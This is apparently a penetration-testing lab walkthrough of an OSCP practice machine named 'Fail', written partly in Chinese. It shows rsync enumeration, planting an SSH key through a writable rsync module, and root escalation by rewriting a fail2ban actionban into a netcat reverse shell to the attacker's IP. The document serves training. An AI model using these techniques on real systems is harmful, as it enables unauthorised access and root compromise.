## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Fail]
└─$ sudo nmap -A -sV -sS -T4 192.168.155.126
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-20 16:26 CST
Nmap scan report for 192.168.155.126
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
873/tcp open  rsync   (protocol version 31)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/20%OT=22%CT=1%CU=35779%PV=Y%DS=4%DC=T%G=Y%TM=64E1CE5
OS:1%P=aarch64-unknown-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%II=I%TS=A)SE
OS:Q(SP=106%GCD=1%ISR=10C%TI=Z%TS=A)OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M5
OS:4ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88
OS:%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%
OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=EA91%RUD=G)IE(R=Y%DFI=N%T=40%CD=S
OS:)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   285.38 ms 192.168.45.1
2   285.02 ms 192.168.45.254
3   285.29 ms 192.168.251.1
4   285.38 ms 192.168.155.126

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.46 seconds
```

[hacktrickes](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync)

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Fail]
└─$ nmap -sV --script "rsync-list-modules" -p 873 192.168.155.126
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-20 16:30 CST
Nmap scan report for 192.168.155.126
Host is up (0.29s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules:
|_  fox            	fox home

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.40 seconds
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Fail]
└─$ rsync -av --list-only rsync://192.168.155.126/fox
receiving incremental file list
drwxr-xr-x          4,096 2021/01/21 22:21:59 .
lrwxrwxrwx              9 2020/12/04 04:22:42 .bash_history -> /dev/null
-rw-r--r--            220 2019/04/18 12:12:36 .bash_logout
-rw-r--r--          3,526 2019/04/18 12:12:36 .bashrc
-rw-r--r--            807 2019/04/18 12:12:36 .profile

sent 20 bytes  received 136 bytes  44.57 bytes/sec
total size is 4,562  speedup is 29.24
```

嘗試使用 rsync 上傳 public key，先建立個 .ssh 資料夾，裡面放自己的公鑰

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Fail/rsyn]
└─$ rsync -av .ssh rsync://fox@192.168.155.126/fox/
sending incremental file list
.ssh/
.ssh/authorized_keys

sent 718 bytes  received 39 bytes  216.29 bytes/sec
total size is 565  speedup is 0.75
```


成功登入！

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Fail]
└─$ ssh fox@192.168.155.126
Linux fail 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$
```


### 提權

透過 linpeas.sh 發現 fox 對 /etc/fail2ban/action.d 具有寫入權限，嘗試搜集 fail2ban 提權手法
[systemweakness](https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49)

依照說明，嘗試修改 iptables-multiport.conf，可以利用裡面的 **actionban** 機制觸發提權，
首先發現該檔案擁有者為 root，但因為 fox 可以 write 此資料夾，故先複製再將其原本檔案覆蓋，便可變更擁有者

```json
fox@fail:/etc/fail2ban/action.d$ ls -la iptables-multiport.conf
-rw-rw-r-- 1 root fail2ban 1420 Jan 18  2018 iptables-multiport.conf
fox@fail:/etc/fail2ban/action.d$ cp iptables-multiport.conf iptables-multiport.conf.bak
fox@fail:/etc/fail2ban/action.d$ mv iptables-multiport.conf.bak iptables-multiport.conf
fox@fail:/etc/fail2ban/action.d$ ls -la iptables-multiport.conf
-rw-r--r-- 1 fox fox 1420 Aug 20 05:23 iptables-multiport.conf
```

接著修改內容，將其動作修改為 nc 回彈 reverse shell

```json
actionban = /usr/bin/nc -e /usr/bin/bash 192.168.45.167 4444
```

接著嘗試觸發，ssh 到該機器且故意 failed

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Fail]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.155.126] 47116
python -c 'import pty;pty.spawn("/bin/bash")'
root@fail:/#
```

成功提權！